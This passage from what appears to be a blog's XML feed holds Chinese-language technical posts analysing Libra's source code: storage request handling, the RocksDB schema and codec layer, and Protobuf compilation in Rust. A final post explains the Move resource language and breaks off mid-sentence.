&#123; access_path, start_event_seq_num, ascending, limit, &#125; =&gt; &#123; ... //query event &#125; RequestItem::GetTransactions &#123; start_version, limit, fetch_events, &#125; =&gt; &#123; //query txn_range命令 &#125; &#125;) .collect::&lt;Result&lt;Vec&lt;_&gt;&gt;&gt;()?; ... &#125; 这里针对用户的请求，分成四类分别处理。实际上这正是RequestItem的定义. 12345678910111213141516171819202122pub enum RequestItem &#123; GetAccountTransactionBySequenceNumber &#123; account: AccountAddress, sequence_number: u64, fetch_events: bool, &#125;, // this can't be the first variant, tracked here https://github.com/AltSysrq/proptest/issues/141 GetAccountState &#123; address: AccountAddress, &#125;, GetEventsByEventAccessPath &#123; access_path: AccessPath, start_event_seq_num: u64, ascending: bool, limit: u64, &#125;, GetTransactions &#123; start_version: Version, limit: u64, fetch_events: bool, &#125;,&#125; AccountState请求是如何处理的123456fn get_account_state_with_proof( &amp;self, address: AccountAddress, version: Version, ledger_version: Version, ) -&gt; Result&lt;AccountStateWithProof&gt; 该请求的处理，调用的是LibraDB的get_account_state_with_proof 调用get_latest_version读取数据库,或者最新的latest_version 验证传递进来的ledger_version必须小于等于latest_version 调用LedgerStore的get_transaction_info_with_proof获取指定Version的txn_info和txn_info_accumulator_proof 调用StateStore.get_account_state_with_proof_by_state_root获取指定地址的account_state_blob和sparse_merkle_proof 组装返回结果 走到这里我们终于把CLI 命令和数据库之间的关联起来了. 至于如何读取数据库的内容,请参考Libra 中数据存储的 Schema 结束语整个文章分文两部分: 一个是grpc的client实现，一个是grpc服务端实现， 整体框架还是非常清晰的。 Libra 作为一个联盟链,其数据结构设计尤其独特之处，整个过程我没有看到任何Block相关字样，都是围绕着Tx展开，这应该是他为了提高TPS所做的优化吧。 虽然Libra称之为BlockChain，但是这里面既没有Block也没有Chain，实际上是一个基于稀疏默克尔树的大状态机。 本文作者为深入浅出共建者：白振轩，欢迎大家关注他的博客 。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>Libra</category>
      </categories>
      <tags>
        <tag>Libra源码分析</tag>
        <tag>libradb</tag>
        <tag>Libra CLI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Libra 源码分析：Libra 中数据存储的 Schema]]></title>
    <url>%2F2019%2F06%2F30%2FSchema-for-data-storage-in-Libra%2F</url>
    <content type="text"><![CDATA[Libra数据存储使用的RocksDB这个KV数据库.并且Libra存储和以太坊基本上思路是一样的,就是一个MPT树来保存Libra这个超级状态机. 因为RocksDB中除了KV以外,还存在着ColumnFamilyName这一项,这个用起来有点像Bucket. schemadb数据的读写123456789101112131415161718192021222324252627282930/// This DB is a schematized RocksDB wrapper where all data passed in and out are typed according to/// [`Schema`]s.#[derive(Debug)]pub struct DB &#123; inner: rocksdb::DB,&#125;impl DB &#123; /// Reads single record by key. pub fn get&lt;S: Schema&gt;(&amp;self, schema_key: &amp;S::Key) -&gt; Result&lt;Option&lt;S::Value&gt;&gt; &#123; //从数据库中读取KV let k = schema_key.encode_key()?; //用的是哪里的encode_key?如何关联起来的? let cf_handle = self.get_cf_handle(S::COLUMN_FAMILY_NAME)?; self.inner .get_cf(cf_handle, &amp;k) .map_err(convert_rocksdb_err)? .map(|raw_value| S::Value::decode_value(&amp;raw_value))//用的是哪里的decode_value?如何关联起来的? .transpose() &#125; /// Writes single record. pub fn put&lt;S: Schema&gt;(&amp;self, key: &amp;S::Key, value: &amp;S::Value) -&gt; Result&lt;()&gt; &#123; //向数据库中写 let k = &lt;S::Key as KeyCodec&lt;S&gt;&gt;::encode_key(&amp;key)?; let v = &lt;S::Value as ValueCodec&lt;S&gt;&gt;::encode_value(&amp;value)?; let cf_handle = self.get_cf_handle(S::COLUMN_FAMILY_NAME)?; self.inner .put_cf_opt(cf_handle, &amp;k, &amp;v, &amp;default_write_options()) .map_err(convert_rocksdb_err) &#125;&#125; 数据的批量写SchemaBatch为了提供写入的效率,Libra还提供了SchemaBatch,用于批量更新数据. 123pub struct SchemaBatch &#123; rows: Vec&lt;(ColumnFamilyName, Vec&lt;u8&gt; /* key */, WriteOp)&gt;,&#125; 一般的用法是： 1234567891011121314let db = TestDB::new(); for i in 0..1000 &#123; let mut db_batch = SchemaBatch::new(); db_batch .put::&lt;TestSchema1&gt;(&amp;TestField(i), &amp;TestField(i)) .unwrap(); db_batch .put::&lt;TestSchema2&gt;(&amp;TestField(i), &amp;TestField(i)) .unwrap(); db.write_schemas(db_batch).unwrap();//一次性提交到数据库中 &#125; db.flush_all(/* sync = */ true).unwrap(); //刷到硬盘 正如我在代码注释中提到的,其实这里的关键问题就是Rust中的数据类型很丰富,但是RocksDB中无论是Key还是Value都只能是字节序列, 因此在存取的时候必然涉及到不断地编码和解码(KeyCodec和ValueCodec). 如何更方便的实现呢? 编码和解码在Libra中针对KV中的Key和Value两个字段分别设计了编解码接口. Key的编码解码trait是KeyCodec,Value的编解码trait则是ValueCodec. 下面是接口,具体的实现则可以参考AccountState的存取过程. 1234567891011121314151617/// This trait defines a type that can serve as a [`Schema::Key`].pub trait KeyCodec&lt;S: Schema + ?Sized&gt;: Sized + PartialEq + Debug &#123; /// Converts `self` to bytes to be stored in DB. fn encode_key(&amp;self) -&gt; Result&lt;Vec&lt;u8&gt;&gt;; /// Converts bytes fetched from DB to `Self`. fn decode_key(data: &amp;[u8]) -&gt; Result&lt;Self&gt;;&#125;/// This trait defines a type that can serve as a [`Schema::Value`].pub trait ValueCodec&lt;S: Schema + ?Sized&gt;: Sized + PartialEq + Debug &#123; /// Converts `self` to bytes to be stored in DB. fn encode_value(&amp;self) -&gt; Result&lt;Vec&lt;u8&gt;&gt;; /// Converts bytes fetched from DB to `Self`. fn decode_value(data: &amp;[u8]) -&gt; Result&lt;Self&gt;;&#125;Rust 编解码器的使用为了降低SchemaBatch中put,get,delete这些函数的参数形式的复杂度以及提供COLUMN_FAMILY_NAME,因此提供了Schema这个trait. 123456789101112/// This trait defines a schema: an association of a column family name, the key type and the value/// type.pub trait Schema &#123; /// The column family name associated with this struct. /// Note: all schemas within the same SchemaDB must have distinct column family names. const COLUMN_FAMILY_NAME: ColumnFamilyName; /// Type of the key. type Key: KeyCodec&lt;Self&gt;; /// Type of the value. type Value: ValueCodec&lt;Self&gt;;&#125; 他没有任何成员函数,就是为了提供Key,Value的类型以及COLUMN_FAMILY_NAME. 通过Schema在SchemaBatch和DB中使用KeyCodec以及ValueCodec就比较方便了. 为了实现方便,还提供了宏define_schema 123456789101112#[macro_export]macro_rules! define_schema &#123; ($schema_type: ident, $key_type: ty, $value_type: ty, $cf_name: expr) =&gt; &#123; pub(crate) struct $schema_type; impl $crate::schema::Schema for $schema_type &#123; const COLUMN_FAMILY_NAME: $crate::ColumnFamilyName = $cf_name; type Key = $key_type; type Value = $value_type; &#125; &#125;;&#125; 说说define_schema这个宏顺便为了学习宏,这里把这个宏展开一下. 12345678//输入:define_schema!(TestSchema, TestKey, TestValue, &quot;TestCF&quot;);struct TestKey(u32, u32, u32);struct TestValue(u32);Rust 对应的内容宏展开后就是: 12345impl crate::schema::Schema for TestSchema &#123; const COLUMN_FAMILY_NAME: crate::ColumnFamilyName = &quot;TestCF&quot;; type Key = TestKey; type Value = TestValue;&#125; 是不是宏看起来也很简单这里就是为了避免重复写这种可以自动生成的代码,因此提供了宏.好处是减少了代码的重复,坏处是目前IDE都不能很好识别宏,导致代码跳转都有问题, AccountState的存取过程为了方便学习,这里选取一个真实的例子,看看上面的内容是如何使用的. 1234567891011121314151617181920212223242526272829define_schema!( AccountStateSchema, HashValue, AccountStateBlob, ACCOUNT_STATE_CF_NAME);//这是对HashValue的编解码,这么写的好处是在put和get中用起来清晰//但是同一个HashValue在不同的Schema中反复出现,则需要反复实现//具体可以参考StateMerkleNodeSchema,他里面的Key也是HashValue,//但是不得不把HashValue的编解码重复了一遍impl KeyCodec&lt;AccountStateSchema&gt; for HashValue &#123; fn encode_key(&amp;self) -&gt; Result&lt;Vec&lt;u8&gt;&gt; &#123; Ok(self.to_vec()) &#125; fn decode_key(data: &amp;[u8]) -&gt; Result&lt;Self&gt; &#123; Ok(HashValue::from_slice(data)?) &#125;&#125;impl ValueCodec&lt;AccountStateSchema&gt; for AccountStateBlob &#123; fn encode_value(&amp;self) -&gt; Result&lt;Vec&lt;u8&gt;&gt; &#123; Ok(self.clone().into()) &#125; fn decode_value(data: &amp;[u8]) -&gt; Result&lt;Self&gt; &#123; Ok(data.to_vec().into()) &#125;&#125; 以SchemaBatch调用过程为例. SchemaBatch.put 放入缓存Vec中 SchemaBatch.put中调用Key的encode_key,Value的encode_value编码成字节序列 DB.write_schemas 写入到磁盘 SchemaBatch put的实现 12345678910/// Adds an insert/update operation to the batch.//这的S可以看做是`AccountStateSchema`,S::Key就是KeyCodec&lt;AccountStateSchema&gt;,//S::Value则是ValueCodec&lt;AccountStateSchema&gt;,注意他们都是trait类型pub fn put&lt;S: Schema&gt;(&amp;mut self, key: &amp;S::Key, value: &amp;S::Value) -&gt; Result&lt;()&gt; &#123; let key = key.encode_key()?; let value = value.encode_value()?; self.rows .push((S::COLUMN_FAMILY_NAME, key, WriteOp::Value(value))); Ok(())&#125; 前面通过宏define_schema生成的辅助代码XXSchema就是为了这里使用,否则参数类型会特别长,并且之间没有强制关联. 数据在数据库中存储主要是依据storage/libradb/src/schema中的定义 12345678910pub(super) const ACCOUNT_STATE_CF_NAME: ColumnFamilyName = &quot;account_state&quot;;pub(super) const EVENT_ACCUMULATOR_CF_NAME: ColumnFamilyName = &quot;event_accumulator&quot;;pub(super) const EVENT_BY_ACCESS_PATH_CF_NAME: ColumnFamilyName = &quot;event_by_access_path&quot;;pub(super) const EVENT_CF_NAME: ColumnFamilyName = &quot;event&quot;;pub(super) const SIGNATURE_CF_NAME: ColumnFamilyName = &quot;signature&quot;;pub(super) const SIGNED_TRANSACTION_CF_NAME: ColumnFamilyName = &quot;signed_transaction&quot;;pub(super) const STATE_MERKLE_NODE_CF_NAME: ColumnFamilyName = &quot;state_merkle_node&quot;;pub(super) const TRANSACTION_ACCUMULATOR_CF_NAME: ColumnFamilyName = &quot;transaction_accumulator&quot;;pub(super) const TRANSACTION_INFO_CF_NAME: ColumnFamilyName = &quot;transaction_info&quot;;pub(super) const VALIDATOR_CF_NAME: ColumnFamilyName = &quot;validator&quot;; account_stateHashValue=&gt;AccountStateBlob的映射 HashValue应该是账户地址 event_accumulator (EventAccumulatorSchema)(Version,Position)=&gt;HashValue使用方法见libradb/src/event_store中的put_events event_by_access_path(AccessPath, SeqNum)=&gt; (Version, Index) event(Version, Index)=&gt;ContractEvent signed_transactionVersion=&gt;SignedTransaction state_merkle_nodeHashValue=&gt;sparse_merkle::node_type::Node transaction_accumulatortypes::proof::position::Position=&gt;HashValue transaction_infoVersion=&gt;TransactionInfo validator(Version,PublicKey)=&gt;()空这个为什么这样定义呢? ledger_infoVersion=&gt;LedgerInfoWithSignatures注意这个是放在DEFAULT_CF_NAME中的 schema的使用state_store位于storage/libradb/src/state_store: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pub(crate) struct StateStore &#123; db: Arc&lt;DB&gt;,&#125;impl StateStore &#123; pub fn new(db: Arc&lt;DB&gt;) -&gt; Self &#123; Self &#123; db &#125; &#125; /// Get the account state blob given account address and root hash of state Merkle tree pub fn get_account_state_with_proof_by_state_root( &amp;self, address: AccountAddress, root_hash: HashValue, ) -&gt; Result&lt;(Option&lt;AccountStateBlob&gt;, SparseMerkleProof)&gt; &#123; let (blob, proof) = SparseMerkleTree::new(self).get_with_proof(address.hash(), root_hash)?; //去数据库中读取在指定roothash情况下的这个地址的状态 debug_assert!( verify_sparse_merkle_element(root_hash, address.hash(), &amp;blob, &amp;proof).is_ok(), &quot;Invalid proof.&quot; ); Ok((blob, proof)) &#125; /// Put the results generated by `keyed_blob_sets` to `batch` and return the result root hashes /// for each write set. pub fn put_account_state_sets( &amp;self, account_state_sets: Vec&lt;HashMap&lt;AccountAddress, AccountStateBlob&gt;&gt;, root_hash: HashValue, batch: &amp;mut SchemaBatch, ) -&gt; Result&lt;Vec&lt;HashValue&gt;&gt; &#123; ... &#125;&#125;impl TreeReader for StateStore &#123; fn get_node(&amp;self, node_hash: HashValue) -&gt; Result&lt;Node&gt; &#123; Ok(self .db .get::&lt;StateMerkleNodeSchema&gt;(&amp;node_hash)? //使用上面的编解码器进行自动解码 .ok_or_else(|| format_err!(&quot;Failed to find node with hash &#123;:?&#125;&quot;, node_hash))?) &#125; fn get_blob(&amp;self, blob_hash: HashValue) -&gt; Result&lt;AccountStateBlob&gt; &#123; Ok(self .db .get::&lt;AccountStateSchema&gt;(&amp;blob_hash)?//使用上面的编解码器进行自动解码 .ok_or_else(|| &#123; format_err!( &quot;Failed to find account state blob with hash &#123;:?&#125;&quot;, blob_hash ) &#125;)?) &#125;&#125; 尤其是下面的get_node和get_blob就非常清晰的看出来,直接使用了StateMerkleNodeSchema和AccountStateSchema进行decode. transaction_store上一个state_store可能看起来稍显复杂,下面的则更清晰直接. 1234567891011121314151617181920212223242526pub(crate) struct TransactionStore &#123; db: Arc&lt;DB&gt;,&#125;impl TransactionStore &#123; pub fn new(db: Arc&lt;DB&gt;) -&gt; Self &#123; Self &#123; db &#125; &#125; /// Get signed transaction given `version` pub fn get_transaction(&amp;self, version: Version) -&gt; Result&lt;SignedTransaction&gt; &#123; self.db .get::&lt;SignedTransactionSchema&gt;(&amp;version)? //get是直接从db读取 .ok_or_else(|| LibraDbError::NotFound(format!(&quot;Txn &#123;&#125;&quot;, version)).into()) &#125; /// Save signed transaction at `version` pub fn put_transaction( &amp;self, version: Version, signed_transaction: &amp;SignedTransaction, batch: &amp;mut SchemaBatch, ) -&gt; Result&lt;()&gt; &#123; batch.put::&lt;SignedTransactionSchema&gt;(&amp;version, signed_transaction) //put则使用的是batch操作 &#125;&#125; event_store和ledger_store123456pub(crate) struct EventStore &#123; db: Arc&lt;DB&gt;,&#125;pub(crate) struct LedgerStore &#123; db: Arc&lt;DB&gt;,&#125; 两者稍微复杂一点,这就不一一列举了，但是思路是完全一样的。 本文作者为深入浅出共建者：白振轩，欢迎大家关注他的博客 。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>Libra</category>
      </categories>
      <tags>
        <tag>Libra源码分析</tag>
        <tag>schemadb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过 Libra 学习 Protobuf]]></title>
    <url>%2F2019%2F06%2F29%2FLearn-Protobuf-in-Libra%2F</url>
    <content type="text"><![CDATA[Protobuf是一种平台无关、语言无关、可扩展且轻便高效的序列化数据结构的协议，可以用于网络通信和数据存储，本文看看它如果应用在 Libra 中。 Libra 是Facebook 牵头发布的基于稳定币的区块链项目，大家可以通过社区翻译的Libra 中文文档入门Libra。 编译安装相关依赖通过执行./scripts/dev_setup.sh是可以自动安装相关依赖以及编译整个libra系统的，参考Libra环境搭建。如果想自己手工安装protobuf相关依赖可以安装如下步骤: 12cargo install protobufcargo install protobuf-codegen 注意:我当前使用的是v2.6.2 找一个文件试试这是我从libra中抠出来的非源文件，位于transaction.proto 。 123456789101112syntax = &quot;proto3&quot;;package types;// Account state as a whole.// After execution, updates to accounts are passed in this form to storage for// persistence.message AccountState &#123; // Account address bytes address = 1; // Account state blob bytes blob = 2;&#125; 运行下面的命令: 1protoc --rust_out . accountstate.proto 可以看到目录下会多出来一个accountstate.rs简单看一下生成的AccountState结构体 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#[derive(PartialEq,Clone,Default)]pub struct AccountState &#123; // message fields pub address: ::std::vec::Vec&lt;u8&gt;, pub blob: ::std::vec::Vec&lt;u8&gt;, // special fields pub unknown_fields: ::protobuf::UnknownFields, pub cached_size: ::protobuf::CachedSize,&#125;impl&lt;'a&gt; ::std::default::Default for &amp;'a AccountState &#123; fn default() -&gt; &amp;'a AccountState &#123; &lt;AccountState as ::protobuf::Message&gt;::default_instance() &#125;&#125;impl AccountState &#123; pub fn new() -&gt; AccountState &#123; ::std::default::Default::default() &#125; // bytes address = 1; pub fn get_address(&amp;self) -&gt; &amp;[u8] &#123; &amp;self.address &#125; pub fn clear_address(&amp;mut self) &#123; self.address.clear(); &#125; // Param is passed by value, moved pub fn set_address(&amp;mut self, v: ::std::vec::Vec&lt;u8&gt;) &#123; self.address = v; &#125; // Mutable pointer to the field. // If field is not initialized, it is initialized with default value first. pub fn mut_address(&amp;mut self) -&gt; &amp;mut ::std::vec::Vec&lt;u8&gt; &#123; &amp;mut self.address &#125; // Take field pub fn take_address(&amp;mut self) -&gt; ::std::vec::Vec&lt;u8&gt; &#123; ::std::mem::replace(&amp;mut self.address, ::std::vec::Vec::new()) &#125; // bytes blob = 2; pub fn get_blob(&amp;self) -&gt; &amp;[u8] &#123; &amp;self.blob &#125; pub fn clear_blob(&amp;mut self) &#123; self.blob.clear(); &#125; // Param is passed by value, moved pub fn set_blob(&amp;mut self, v: ::std::vec::Vec&lt;u8&gt;) &#123; self.blob = v; &#125; // Mutable pointer to the field. // If field is not initialized, it is initialized with default value first. pub fn mut_blob(&amp;mut self) -&gt; &amp;mut ::std::vec::Vec&lt;u8&gt; &#123; &amp;mut self.blob &#125; // Take field pub fn take_blob(&amp;mut self) -&gt; ::std::vec::Vec&lt;u8&gt; &#123; ::std::mem::replace(&amp;mut self.blob, ::std::vec::Vec::new()) &#125;&#125; 除了这些，还为AccountState自动生成了protobuf::Message，protobuf::Clear和std::fmt::Debug接口。 注意如果是Service的话，一样会自动生成一个_grpc.rs文件，用于服务的实现。 利用build.rs自动将proto编译成rsrust在工程化方面做的非常友好，我们可以编译的过程都可以介入。也就是如果我们的项目目录下有build.rs，那么在运行 cargo build 之前会自动编译然后运行此程序。 相当于在项目目录下运行 cargo run build.rs 然后再去build。这看起来有点类似于go中的//go:generate command argument...， 但是要更为强大，更为灵活。 build.rs在Libra中包含了proto的子项目都会在项目根目录下包含一个build.rs. 其内容非常简单。 12345678910fn main() &#123; let proto_root = &quot;src/proto&quot;; let dependent_root = &quot;../../types/src/proto&quot;; build_helpers::build_helpers::compile_proto( proto_root, vec![dependent_root], false, /* generate_client_code */ );&#125; 这是storage_proto/build.rs， 主要有两个参数是proto_root和dependent_root: proto_root :表示要自动转换的proto所在目录 dependent_root :表示编译这些proto文件import所引用的目录，也就是protoc -I参数指定的目录. 当然编译成的rs文件如果要正常工作，那么也必须编译dependent_root中的所有proto文件才行 至于第三个参数generate_client_code， 则表示是否生成client代码，也就是如果proto中包含Service，那么是否也生成grpc client的辅助代码。 简单解读 build_helperbuild_helper 位于common/build_helper，是为了辅助自动将proto文件编译成rs文件。 123456789101112131415161718192021222324252627282930313233343536373839404142pub fn compile_proto(proto_root: &amp;str, dependent_roots: Vec&lt;&amp;str&gt;, generate_client_code: bool) &#123; let mut additional_includes = vec![]; for dependent_root in dependent_roots &#123; // First compile dependent directories compile_dir( &amp;dependent_root, vec![], /* additional_includes */ false, /* generate_client_code */ ); additional_includes.push(Path::new(dependent_root).to_path_buf()); &#125; // Now compile this directory compile_dir(&amp;proto_root, additional_includes, generate_client_code);&#125;// Compile all of the proto files in proto_root directory and use the additional// includes when compiling.pub fn compile_dir( proto_root: &amp;str, additional_includes: Vec&lt;PathBuf&gt;, generate_client_code: bool,) &#123; for entry in WalkDir::new(proto_root) &#123; let p = entry.unwrap(); if p.file_type().is_dir() &#123; continue; &#125; let path = p.path(); if let Some(ext) = path.extension() &#123; if ext != "proto" &#123; continue; &#125; println!("cargo:rerun-if-changed=&#123;&#125;", path.display()); compile(&amp;path, &amp;additional_includes, generate_client_code); &#125; &#125;&#125;fn compile(path: &amp;Path, additional_includes: &amp;[PathBuf], generate_client_code: bool) &#123; ...&#125; build.rs 直接调用的就是compile_proto这个函数，他非常简单就是先调用compile_dir来编译所有的依赖，然后再编译自身. 而compile_dir则是遍历指定的目录，利用WalkDir查找当前目录下所有的proto文件，然后逐个调用compile进行编译. rust中的字符串处理1234567891011fn compile(path: &amp;Path, additional_includes: &amp;[PathBuf], generate_client_code: bool) &#123; let parent = path.parent().unwrap(); let mut src_path = parent.to_owned().to_path_buf(); src_path.push("src"); let mut includes = Vec::from(additional_includes); //写成additional_includes.to_owned()也是可以的 let mut includes = additional_includes.to_owned(); //最终都会调用slice的to_vec includes.push(parent.to_path_buf()); ....&#125; 要跟操作系统打交道，⾸先需要介绍的是两个字符串类型：OsString 以及它所对应的字符串切⽚类型OsStr。它们存在于std::ffi模块中。 Rust标准的字符串类型是String和str。它们的⼀个重要特点是保证了内部编码是统⼀的utf-8。但是，当我们和具体的操作系统打交道时，统⼀的utf-8编码是不够⽤的，某些操作系统并没有规定⼀定是⽤的utf-8编码。所以，在和操作系统打交道的时候，String/str类型并不是⼀个很好的选择。 ⽐如在Windows系统上，字符⼀般是⽤16位数字来表⽰的。 为了应付这样的情况，Rust在标准库中又设计了OsString/OsStr来处理这样的情况。这两种类型携带的⽅法跟String/str⾮常类似，⽤起来⼏乎没什么区别，它们之间也可以相互转换。 Rust标准库中⽤PathBuf和Path两个类型来处理路径。它们之间的关系就类似String和str之间的关系：⼀个对内部数据有所有权，还有⼀个只是借⽤。实际上，读源码可知，PathBuf⾥⾯存的是⼀个OsString，Path⾥⾯存的是⼀个OsStr。这两个类型定义在std::path模块中。 通过这种方式可以方便的在字符串和Path，PathBuf之间进行任意转换。在compile_dir的第23行中，我们提供给WalkDir::new一个&amp;str，rust自动将其转换为了Path。 FromProto和IntoProto出于跨平台的考虑，proto文件中的数据类型表达能力肯定不如rust丰富，所以不可避免需要在两者之间进行类型转换. 因此Libra中提供了proto_conv接口专门用于实现两者之间的转换. 比如: 12345678910111213141516171819202122232425/// Helper to construct and parse [`proto::storage::GetAccountStateWithProofByStateRootRequest`]////// It does so by implementing `IntoProto` and `FromProto`,/// providing `into_proto` and `from_proto`.#[derive(PartialEq, Eq, Clone, FromProto, IntoProto)]#[ProtoType(crate::proto::storage::GetAccountStateWithProofByStateRootRequest)]pub struct GetAccountStateWithProofByStateRootRequest &#123; /// The access path to query with. pub address: AccountAddress, /// the state root hash the query is based on. pub state_root_hash: HashValue,&#125;/// Helper to construct and parse [`proto::storage::GetAccountStateWithProofByStateRootResponse`]////// It does so by implementing `IntoProto` and `FromProto`,/// providing `into_proto` and `from_proto`.#[derive(PartialEq, Eq, Clone)]pub struct GetAccountStateWithProofByStateRootResponse &#123; /// The account state blob requested. pub account_state_blob: Option&lt;AccountStateBlob&gt;, /// The state root hash the query is based on. pub sparse_merkle_proof: SparseMerkleProof,&#125; 针对GetAccountStateWithProofByStateRootRequest可以自动在crate::proto::storage::GetAccountStateWithProofByStateRootRequest和GetAccountStateWithProofByStateRootRequest之间进行转换，只需要derive(FromProto,IntoProto)即可。而针对GetAccountStateWithProofByStateRootResponse 则由于只能手工实现。 12345678910111213141516171819202122232425262728293031impl FromProto for GetAccountStateWithProofByStateRootResponse &#123; type ProtoType = crate::proto::storage::GetAccountStateWithProofByStateRootResponse; fn from_proto(mut object: Self::ProtoType) -&gt; Result&lt;Self&gt; &#123; let account_state_blob = if object.has_account_state_blob() &#123; Some(AccountStateBlob::from_proto( object.take_account_state_blob(), )?) &#125; else &#123; None &#125;; Ok(Self &#123; account_state_blob, sparse_merkle_proof: SparseMerkleProof::from_proto(object.take_sparse_merkle_proof())?, &#125;) &#125;&#125;impl IntoProto for GetAccountStateWithProofByStateRootResponse &#123; type ProtoType = crate::proto::storage::GetAccountStateWithProofByStateRootResponse; fn into_proto(self) -&gt; Self::ProtoType &#123; let mut object = Self::ProtoType::new(); if let Some(account_state_blob) = self.account_state_blob &#123; object.set_account_state_blob(account_state_blob.into_proto()); &#125; object.set_sparse_merkle_proof(self.sparse_merkle_proof.into_proto()); object &#125;&#125; 本文作者为深入浅出共建者：白振轩，欢迎大家关注他的博客 。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>Libra</category>
      </categories>
      <tags>
        <tag>Libra</tag>
        <tag>Protobuf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解读Libra Move：一种可编程资源语言]]></title>
    <url>%2F2019%2F06%2F28%2Fdeep-move%2F</url>
    <content type="text"><![CDATA[Facebook最近发表了许可链项目Libra，其中的最大亮点是Move语言。 下面我们从技术视角解读一下“Move: A Language With Programmable Resources”这篇白皮书，供大家参考。 为了便于理解，我们拿比特币、以太坊和Libra来做一个对比。 可编程货币、可编程应用与可编程资源其实，单从白皮书的标题，就可以大概看出三个项目在设计目标上的差异。 比特币的目标是——可编程货币（Programmable Money），所以白皮书标题是“Bitcoin: A peer-to-peer electronic cash system”。 以太坊的目标是——可编程的去中心化应用（Programmable dApps），在货币的基础上，扩展到更通用的领域。所以白皮书标题是：“Ethereum: a next generation smart contract and decentralized application platform”，黄皮书标题是：“Ethereum: A secure decentralized generalized transaction ledger”。 而Libra的设计目标恰好介于二者中间——可编程资源（Programmable Resources），或者叫可编程资产。 Facebook的技术路线比较务实，没有尝试更颠覆性的创新，而是把目光聚焦在“货币”和“通用应用”之间的“资产”，围绕解决实际问题，便于工程实现而展开。从这点来看，Libra既不是区块链3.0也不是4.0，而是区块链1.5。但这并不代表Libra的目标没有挑战，事实上，实现一个可以保证资产安全性，又能够提供足够灵活性的系统，比臆想出一个解决“不可能三角”的永动机还要困难。 那么，“可编程货币”、“可编程应用”、“可编程资源”，这三者到底有什么不同呢？ 既然都是“可编程XX”句式，他们的主要区别就在于两点： 对什么编程; 如何编程。 对什么编程？对什么编程，是指系统所描述或者抽象的，到底是现实世界中的什么东西。 比特币对“货币”编程比特币系统抽象的是“货币”，或者说是“账本”的概念。货币可以用一个数字来描述，也就是某一个账户的“余额”。用户可以通过“交易”，把一部分钱转给别人。当比特币网络接收到一笔交易的时候，每个节点都会检查交易是否合法，比如你花的是不是自己的钱，有没有足够的余额（比特币不允许透支）。当这些检查都成功后，节点会做一个简单的加减计算：在你的账户中扣减转账的数额，并在对方账户中加上同样的数量。因此，比特币唯一的功能就是记账，保证在账户彼此转账的过程中，货币的总量不会莫名其妙的增加或减少（不考虑挖矿奖励和黑洞地址等特例）。 以太坊对“应用”编程以太坊系统抽象的是“应用”，应用的种类包罗万象，比如游戏、借贷系统、电商系统、交易所等，这些都是应用。理论上讲，任何传统的计算机程序都可以移植到以太坊上。因此，以太坊中记录的是各种应用的内部数据（即“合约状态”），比如一个电商系统的库存、订单、结算信息等。这些信息无法用一个简单的数字来描述，必须允许用户定义非常复杂的数据结构，并且允许用户通过代码（智能合约），来对这些数据进行任意所需的操作。当然，这些应用也包含了“货币账本”。事实上，目前在以太坊上应用最广泛的正是此类应用（称为“ERC20智能合约”）。由于以太坊把这类应用看作是平台所能支持的多种应用中的一种，与其他类型的应用相比，并没有什么特别之处，所以也就没有针对此类应用提供更多的安全保护，只提供了类似ERC20这样的接口规范。一个在以太坊上新发行的“货币”，其转账逻辑的正确性完全由开发者负责。 在以太坊的存储结构中，ERC20代币的账本是“二级对象”，和ETH原生代币余额存储在不同的地方。例如上图所示，0x0，0x1和0x2是三个以太坊地址，其中，0x0和0x2是普通账户地址（External accounts），而0x1是一个合约地址（Contract accounts）。我们可以看到，每个账户都存储了一个ETH的余额，这个数据是顶级对象(First-Class Object)。在合约地址0x1中，还存储了一个智能合约代码MyCoin，它是一个ERC20代币应用。而MyCoin这个代币的整个账本，都存储在0x1的空间中，怎么修改都由0x1中的合约代码说了算。 无论是有意还是无意，ERC20代币非常容易出现安全漏洞。也就是说，在以太坊系统中，原生代币ETH和用户发行的代币并不享有同样的安全级别。 Libra 对“资产”编程那么，能否不那么走极端，试图去抽象一些比简单数字更复杂的资产类型，而又不追求包罗万象的“通用性”呢？这正是Libra的出发点。Libra可以定义类似一篮子货币、金融衍生品等比货币更复杂的资产类型，以及如何对他们进行操作，这种资产被称为“资源”。Move通过限制对资源的操作来防止不恰当的修改，从而提高资产的安全性。无论资源的操作逻辑如何，都必须满足两个约束条件： 稀缺性。即资产总量必须受控，不允许用户随意复制资源。通俗的说，就是允许银行印钞，但不允许用户用复印机来“制造”新钱； 权限控制。简单的说就是资源的操作必须满足某种预先定义的规则。例如，张三只能花自己的钱，而不允许花李四的钱。 上图是Move的世界状态，与以太坊不同，它把所有资产都当作是“一等公民”（First-Class Resources），无论是Libra的原生代币，还是用户自己发行的资产。任何一个“币种”的余额，都存储在用户地址对应的空间中，对其进行操作受到严格的限制。这种被称为资源（resource）的对象，在交易中只能被移动，而且只能移动一次，既不能被复制，也不能被消毁。甚至严格到在代码中赋值给一个局部变量，而后面没有使用它也不允许。 这种资产的存储方式并非Libra独创，在此前的一些公链中已有应用，例如在Vite公链中，用户发行的币种余额也是顶级对象。不过Move可以支持更为复杂的资产类型，并对其提供额外的保护，这是Libra的主要贡献。 编者组： Vite 是本文作者创建的项目。 如何编程？我们再来看看三个项目如何通过编程来实现丰富的扩展性。 比特币脚本在比特币中，定义了一种“比特币脚本”，用来描述花一笔钱的规则。比特币是基于UTXO模型的，只有满足了预先定义的脚本规则，才能花费一笔UTXO。通过比特币脚本，可以实现“多重签名”之类的复杂逻辑。比特币脚本是一种非常简单的基于栈的字节码，不支持循环之类的复杂结构，也不是图灵完备的。虽然利用它可以在比特币网络上发行新的货币（Colored Coins），但它的描述能力非常有限，对开发者也不友好，无法应用到更复杂的场景中。 以太坊的 Solidity语言在以太坊中，定义了一种Solidity的编程语言，可以用来开发“智能合约”。智能合约代码可以编译成一种基于栈的字节码——EVM 